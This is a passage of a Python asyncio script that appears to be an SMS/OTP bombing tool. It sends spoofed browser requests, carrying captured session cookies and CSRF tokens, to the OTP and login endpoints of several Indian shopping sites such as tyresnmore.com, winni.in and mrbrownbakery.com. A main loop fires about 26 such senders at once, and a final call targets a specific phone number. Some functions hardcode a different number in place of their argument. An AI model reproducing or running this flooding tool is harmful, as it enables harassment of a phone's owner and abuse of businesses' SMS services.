                # 'Cookie': 'webtype=undefined; googtrans=/en/en; googtrans=/en/en; NSSESSION=s%3A5F3M9bQxPYwjWs6sccTs7kELDQ0ymZoS.D9vpeOjw%2BSz5YpqWTB7BZadYQASgBBiG9QYGSqz8q50; PHPWEBSTORESESSION=5F3M9bQxPYwjWs6sccTs7kELDQ0ymZoS; twk_idm_key=a93bTn7z3Qzoos1T_rgPs; TawkConnectionTime=0; twk_uuid_61268648649e0a0a5cd2eea9=%7B%22uuid%22%3A%221.SwpLLChOGslHzfjvXF5GksFDS6RycfQKwS0P7bSLHLnW6nLf1NgcYi7V4hVqcBhc66wPveCNJlrIhm966EgS3ww653IVUmCWIn1ukTOysDY2HvAvbb6IC%22%2C%22version%22%3A3%2C%22domain%22%3A%22flyphones.in%22%2C%22ts%22%3A1688927126119%7D',
                'Origin': 'https://www.flyphones.in',
                'Referer': 'https://www.flyphones.in/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            data = {
                'action': 'sendOtp',
                'data': '{"supid":70237,"mobile":"9990212082","from":"signup"}',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                'https://www.flyphones.in/functions/market/ajxgrocpharmaction.php',
                cookies=cookies,
                headers=headers,
                data=data,
                ) as response:
                    print(response.text)
                return "done"
        except Exception as e:
            return "failed"
        
    async def tyre(tarnum: int):
        try:
            cookies = {
                'form_key': 'Ke8B8fC3DlS1v2mD',
                'mage-cache-storage': '{}',
                'mage-cache-storage-section-invalidation': '{}',
                'mage-cache-sessid': 'true',
                'PHPSESSID': 'b2ddeb3f26d7fa59d8fd1e21065f24fe',
                'form_key': 'Ke8B8fC3DlS1v2mD',
                'mage-messages': '',
                'recently_viewed_product': '{}',
                'recently_viewed_product_previous': '{}',
                'recently_compared_product': '{}',
                'recently_compared_product_previous': '{}',
                'product_data_storage': '{}',
                '_gcl_au': '1.1.1382506490.1688927391',
                '_ga_35FKSWSLD2': 'GS1.1.1688927391.1.0.1688927391.60.0.0',
                '_uetsid': '97c9d4601e8611ee88966539e39ca4b6',
                '_uetvid': '97ca14d01e8611ee85c75f7179a410c9',
                '_ga': 'GA1.2.1390966305.1688927391',
                '_gid': 'GA1.2.98156956.1688927392',
                '_dc_gtm_UA-51959063-1': '1',
                '_clck': '1ibzzk2|2|fd5|0|1285',
                '_fbp': 'fb.1.1688927392382.1598686577',
                '_clsk': '9jdc3h|1688927393245|1|1|u.clarity.ms/collect',
                '_gat_UA-51959063-1': '1',
                'section_data_ids': '{%22customer%22:1688927600%2C%22messages%22:null}',
            }

            headers = {
                'authority': 'tyresnmore.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'form_key=Ke8B8fC3DlS1v2mD; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; PHPSESSID=b2ddeb3f26d7fa59d8fd1e21065f24fe; form_key=Ke8B8fC3DlS1v2mD; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _gcl_au=1.1.1382506490.1688927391; _ga_35FKSWSLD2=GS1.1.1688927391.1.0.1688927391.60.0.0; _uetsid=97c9d4601e8611ee88966539e39ca4b6; _uetvid=97ca14d01e8611ee85c75f7179a410c9; _ga=GA1.2.1390966305.1688927391; _gid=GA1.2.98156956.1688927392; _dc_gtm_UA-51959063-1=1; _clck=1ibzzk2|2|fd5|0|1285; _fbp=fb.1.1688927392382.1598686577; _clsk=9jdc3h|1688927393245|1|1|u.clarity.ms/collect; _gat_UA-51959063-1=1; section_data_ids={%22customer%22:1688927600%2C%22messages%22:null}',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM3MzA3NTAiLCJhcCI6IjExMjAxNDI0NDkiLCJpZCI6ImUzMjJmMjZkNmVjOTE1NzciLCJ0ciI6IjMzOTg3M2ZiNjMxOGQxZjIzOTEzMTk0YjY2MWNkYzAwIiwidGkiOjE2ODg5Mjc0MDM5MDAsInRrIjoiMTMyMjg0MCJ9fQ==',
                'origin': 'https://tyresnmore.com',
                'referer': 'https://tyresnmore.com/',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'traceparent': '00-339873fb6318d1f23913194b661cdc00-e322f26d6ec91577-01',
                'tracestate': '1322840@nr=0-1-3730750-1120142449-e322f26d6ec91577----1688927403900',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'x-newrelic-id': 'VwEEUVFWCBABVFhaAQMDUFIG',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'form_key': 'Ke8B8fC3DlS1v2mD',
                'phone_number': '9990212082',
                'login_type': 'otp',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://tyresnmore.com/otplogin/account/otploginpost/', cookies=cookies, headers=headers, data=data) as response:
                    print(response.text)

                return "done"
        except Exception as e:
            return "failed"  



    async def winni(tarnum: int):
        try:
            cookies = {
                'AKA_A2': 'A',
                '_gcl_au': '1.1.2039960549.1688927485',
                '_gid': 'GA1.2.937546034.1688927485',
                '_gat_UA-38175959-1': '1',
                '_tguatd': '{"sc":"(direct)"}',
                '_tgpc': '655bb04b-e388-5ec3-bd8b-a8e56666814b',
                '_tgidts': '{"sh":"d41d8cd98f00b204e9800998ecf8427e","ci":"1743c5fb-44a8-5c2e-b256-9aa5e1c16f3b","si":"9f21a045-ddc8-5178-b49c-11ce596b43ba"}',
                'v': '357897496',
                'ud': 'D3A659BF-927C-4B7B-BA7B-2CCF1EEA916A',
                'puid': '284114',
                'aqs': '4',
                'XSRF-TOKEN': '44085e1e-b1a6-48ac-8227-976432c128ca',
                'sessid': 'MzVlMmRlM2EtNTlhNC00ZGVjLWI1ZjUtMDJhYWZmZDA2Yjg1',
                '_fbp': 'fb.1.1688927485666.1294176012',
                '_tgsc': '9f21a045-ddc8-5178-b49c-11ce596b43ba:-1',
                '_tglksd': '{"s":"9f21a045-ddc8-5178-b49c-11ce596b43ba","st":1688927484937,"sod":"(direct)","sodt":1688927484937,"sods":"c","sodst":1688927513043}',
                '_ga_R2MDN249LR': 'GS1.1.1688927485.1.1.1688927513.32.0.0',
                '_ga': 'GA1.1.390273447.1688927485',
                '_uetsid': 'cf9c79301e8611eebf6f9b5685805bfe',
                '_uetvid': 'e21a5360ef4711ed940669c6e55b096c',
                'AWSALBTG': '6hqOd5foLrtC1UscIhfPJxUKhRRMw+A3aDOJh8dNQR/0hu+QH9XvGZYHlJmSar7enmDINeY/h+rd7QQD5iWw6hUJbupMasAefnXtAMC9qF+NS40+rctbs0QNyW+ci+UoUPcsoLRmgUUgug65PGeuQBzAlzmpMSpGXH9vM0Puod5o',
                'AWSALBTGCORS': '6hqOd5foLrtC1UscIhfPJxUKhRRMw+A3aDOJh8dNQR/0hu+QH9XvGZYHlJmSar7enmDINeY/h+rd7QQD5iWw6hUJbupMasAefnXtAMC9qF+NS40+rctbs0QNyW+ci+UoUPcsoLRmgUUgug65PGeuQBzAlzmpMSpGXH9vM0Puod5o',
                'AWSALB': 'RekWcV+8va1tPHhN+xKtIUFwdbvkSvGZDMZVAMYbvzO0TnUFAvtgdNPE6t39NMY8ZYUbfoLezRosloW+rZgOX9mr3uZRPdaxl8v7YrOLVCyEY8E0ad2lFhKiJRgH',
                'AWSALBCORS': 'RekWcV+8va1tPHhN+xKtIUFwdbvkSvGZDMZVAMYbvzO0TnUFAvtgdNPE6t39NMY8ZYUbfoLezRosloW+rZgOX9mr3uZRPdaxl8v7YrOLVCyEY8E0ad2lFhKiJRgH',
                '_tgsid': '{"lpd":"{\\"lpu\\":\\"https://www.winni.in%2F\\",\\"lpt\\":\\"%231%20online%20Cake%2C%20Flowers%20and%20Gifts%20Delivery%20in%20India%20%7C%20Winni\\"}","ps":"d628e8d2-a0d7-45fb-a886-46133d205d37","ec":"4","pv":"1"}',
                'RT': '"z=1&dm=www.winni.in&si=b324df05-c8c2-4d69-9dee-82bfd848f2f6&ss=ljvrtemr&sl=1&tt=1qk&rl=1&nu=3nqtq01e&cl=qxd"',
                'kndctr_C757499F6284EAAF0A495C50_AdobeOrg_cluster': 'ind1',
                'kndctr_C757499F6284EAAF0A495C50_AdobeOrg_identity': 'CiY0MzMwODU1NjEwNjkyMTA5Nzk2MTM4NDg1NzIxMzkwMjkzMDM2OVIPCJjxv9-TMRgBKgRJTkQxoAGc8b_fkzHwAZjxv9-TMQ==',
                'AMCV_C757499F6284EAAF0A495C50%40AdobeOrg': 'MCMID|43308556106921097961384857213902930369',
                '_tgtim': '9f21a045-ddc8-5178-b49c-11ce596b43ba:1688927488862:-1',
            }

            headers = {
                'authority': 'www.winni.in',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'AKA_A2=A; _gcl_au=1.1.2039960549.1688927485; _gid=GA1.2.937546034.1688927485; _gat_UA-38175959-1=1; _tguatd={"sc":"(direct)"}; _tgpc=655bb04b-e388-5ec3-bd8b-a8e56666814b; _tgidts={"sh":"d41d8cd98f00b204e9800998ecf8427e","ci":"1743c5fb-44a8-5c2e-b256-9aa5e1c16f3b","si":"9f21a045-ddc8-5178-b49c-11ce596b43ba"}; v=357897496; ud=D3A659BF-927C-4B7B-BA7B-2CCF1EEA916A; puid=284114; aqs=4; XSRF-TOKEN=44085e1e-b1a6-48ac-8227-976432c128ca; sessid=MzVlMmRlM2EtNTlhNC00ZGVjLWI1ZjUtMDJhYWZmZDA2Yjg1; _fbp=fb.1.1688927485666.1294176012; _tgsc=9f21a045-ddc8-5178-b49c-11ce596b43ba:-1; _tglksd={"s":"9f21a045-ddc8-5178-b49c-11ce596b43ba","st":1688927484937,"sod":"(direct)","sodt":1688927484937,"sods":"c","sodst":1688927513043}; _ga_R2MDN249LR=GS1.1.1688927485.1.1.1688927513.32.0.0; _ga=GA1.1.390273447.1688927485; _uetsid=cf9c79301e8611eebf6f9b5685805bfe; _uetvid=e21a5360ef4711ed940669c6e55b096c; AWSALBTG=6hqOd5foLrtC1UscIhfPJxUKhRRMw+A3aDOJh8dNQR/0hu+QH9XvGZYHlJmSar7enmDINeY/h+rd7QQD5iWw6hUJbupMasAefnXtAMC9qF+NS40+rctbs0QNyW+ci+UoUPcsoLRmgUUgug65PGeuQBzAlzmpMSpGXH9vM0Puod5o; AWSALBTGCORS=6hqOd5foLrtC1UscIhfPJxUKhRRMw+A3aDOJh8dNQR/0hu+QH9XvGZYHlJmSar7enmDINeY/h+rd7QQD5iWw6hUJbupMasAefnXtAMC9qF+NS40+rctbs0QNyW+ci+UoUPcsoLRmgUUgug65PGeuQBzAlzmpMSpGXH9vM0Puod5o; AWSALB=RekWcV+8va1tPHhN+xKtIUFwdbvkSvGZDMZVAMYbvzO0TnUFAvtgdNPE6t39NMY8ZYUbfoLezRosloW+rZgOX9mr3uZRPdaxl8v7YrOLVCyEY8E0ad2lFhKiJRgH; AWSALBCORS=RekWcV+8va1tPHhN+xKtIUFwdbvkSvGZDMZVAMYbvzO0TnUFAvtgdNPE6t39NMY8ZYUbfoLezRosloW+rZgOX9mr3uZRPdaxl8v7YrOLVCyEY8E0ad2lFhKiJRgH; _tgsid={"lpd":"{\\"lpu\\":\\"https://www.winni.in%2F\\",\\"lpt\\":\\"%231%20online%20Cake%2C%20Flowers%20and%20Gifts%20Delivery%20in%20India%20%7C%20Winni\\"}","ps":"d628e8d2-a0d7-45fb-a886-46133d205d37","ec":"4","pv":"1"}; RT="z=1&dm=www.winni.in&si=b324df05-c8c2-4d69-9dee-82bfd848f2f6&ss=ljvrtemr&sl=1&tt=1qk&rl=1&nu=3nqtq01e&cl=qxd"; kndctr_C757499F6284EAAF0A495C50_AdobeOrg_cluster=ind1; kndctr_C757499F6284EAAF0A495C50_AdobeOrg_identity=CiY0MzMwODU1NjEwNjkyMTA5Nzk2MTM4NDg1NzIxMzkwMjkzMDM2OVIPCJjxv9-TMRgBKgRJTkQxoAGc8b_fkzHwAZjxv9-TMQ==; AMCV_C757499F6284EAAF0A495C50%40AdobeOrg=MCMID|43308556106921097961384857213902930369; _tgtim=9f21a045-ddc8-5178-b49c-11ce596b43ba:1688927488862:-1',
                'origin': 'https://www.winni.in',
                'referer': 'https://www.winni.in/customer/login',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                'x-xsrf-token': '44085e1e-b1a6-48ac-8227-976432c128ca',
            }

            data = {
                'email': '',
                'mobile': '9990212082',
                'countryCode': '+91',
                'scrval': '',
                'isvlexst': 'nguTGPa4QPlAKM32kkam1AlamJs39qNpATqNb2s',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.winni.in/customer/verify-email', cookies=cookies, headers=headers, data=data) as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    
    async def mrbrown(tarnum: int):
        try:
            cookies = {
                '_gcl_au': '1.1.1957854088.1688927598',
                '_gid': 'GA1.2.1582251896.1688927599',
                '_gat_UA-78924810-1': '1',
                '_clck': '8sn6gz|2|fd5|0|1285',
                '_fbp': 'fb.1.1688927600216.1704611332',
                'delpin': '110001',
                'XSRF-TOKEN': 'eyJpdiI6IjZRbzJ0V2s3VEJEUHJTUlZJZGVLMmc9PSIsInZhbHVlIjoiN0p2UDd1N3JBMTVrWkdYdmMyNVZaMDlPV2xqQUtYN2NjRGFrVWJkaTVadUQrWHJCSlpvaUptM3RLTnQzQ0g2byIsIm1hYyI6IjI5ZDhjMzg2MjJmOTc1OTI3NmJmZmRiNzBjOThhODc0YzEwNGQ3MWI4Mjg4NDVkOGUwZjMxMjUzNWJlMzM2YmQifQ%3D%3D',
                'brown_session': 'eyJpdiI6ImduXC9nMjYyWFBIXC9aVmp0K3JuZDErUT09IiwidmFsdWUiOiJCV09OTEcweXhUXC9CQWlrVHJwZENsb0lnZjFzYjdlcnNhZ1ZRdmxZWmdmU3NCNEJVWFpuRytJMUJJYnNqTjYrQyIsIm1hYyI6IjZmZjRjZTk0YWRmNWI0OTJjZGM3ZDE4YzA4MWIwNzc1YWRlNjgzMjkyMmFiNDVmYWMyMjA3MDUwMjA4MTNiZDYifQ%3D%3D',
                '_ga_VQHFT3DPHH': 'GS1.1.1688927598.1.1.1688927601.57.0.0',
                '_ga': 'GA1.2.778904199.1688927599',
                '_ga_JN38K0S1LX': 'GS1.2.1688927599.1.1.1688927602.57.0.0',
                '_clsk': '1nw0vh8|1688927602671|2|1|t.clarity.ms/collect',
            }

            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'Cookie': '_gcl_au=1.1.1957854088.1688927598; _gid=GA1.2.1582251896.1688927599; _gat_UA-78924810-1=1; _clck=8sn6gz|2|fd5|0|1285; _fbp=fb.1.1688927600216.1704611332; delpin=110001; XSRF-TOKEN=eyJpdiI6IjZRbzJ0V2s3VEJEUHJTUlZJZGVLMmc9PSIsInZhbHVlIjoiN0p2UDd1N3JBMTVrWkdYdmMyNVZaMDlPV2xqQUtYN2NjRGFrVWJkaTVadUQrWHJCSlpvaUptM3RLTnQzQ0g2byIsIm1hYyI6IjI5ZDhjMzg2MjJmOTc1OTI3NmJmZmRiNzBjOThhODc0YzEwNGQ3MWI4Mjg4NDVkOGUwZjMxMjUzNWJlMzM2YmQifQ%3D%3D; brown_session=eyJpdiI6ImduXC9nMjYyWFBIXC9aVmp0K3JuZDErUT09IiwidmFsdWUiOiJCV09OTEcweXhUXC9CQWlrVHJwZENsb0lnZjFzYjdlcnNhZ1ZRdmxZWmdmU3NCNEJVWFpuRytJMUJJYnNqTjYrQyIsIm1hYyI6IjZmZjRjZTk0YWRmNWI0OTJjZGM3ZDE4YzA4MWIwNzc1YWRlNjgzMjkyMmFiNDVmYWMyMjA3MDUwMjA4MTNiZDYifQ%3D%3D; _ga_VQHFT3DPHH=GS1.1.1688927598.1.1.1688927601.57.0.0; _ga=GA1.2.778904199.1688927599; _ga_JN38K0S1LX=GS1.2.1688927599.1.1.1688927602.57.0.0; _clsk=1nw0vh8|1688927602671|2|1|t.clarity.ms/collect',
                'Origin': 'https://mrbrownbakery.com',
                'Referer': 'https://mrbrownbakery.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'X-CSRF-TOKEN': 'JTa7wXeLBp7IvdbrFf1PHTgnbHRJ2OEcEMdct6e2',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            data = {
                'mobile': '9990212082',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://mrbrownbakery.com/customer/loginmobile', cookies=cookies, headers=headers, data=data)as response:
                    print(response.text)
            return "done"
        except Exception as e:
            return "failed"
    
    
    async def main(tarnum):
        print("here")
        
        for i in range (2):
            jh = await asyncio.gather(
                whitehat(tarnum ),    
                moglix(tarnum ),  
                medibuddy(tarnum ),   
                gopaysense(tarnum), 
                rapido(tarnum), 
                dunzo(tarnum),   
                byjus(tarnum ),   
                ballebazi(tarnum ),   
                zee5(tarnum),    
                doubtnut(tarnum),    
                vedantu(tarnum), 
                upgrade(tarnum), 
                physics(tarnum), 
                confirm(tarnum), 
                redbus(tarnum) ,  
                trainman(tarnum),    
                decathon(tarnum),    
                lybra(tarnum),   
                dentalcart(tarnum),  
                skecher(tarnum), 
                croma(tarnum),   
                tendercut(tarnum),   
                textbook(tarnum),    
                mg1(tarnum), 
                apollo247(tarnum),   
                unacademy(tarnum)
                )
            print(jh)
    asyncio.run(main(tarnum))

indsms(9212548545)
end = time.time()
print(end-start)

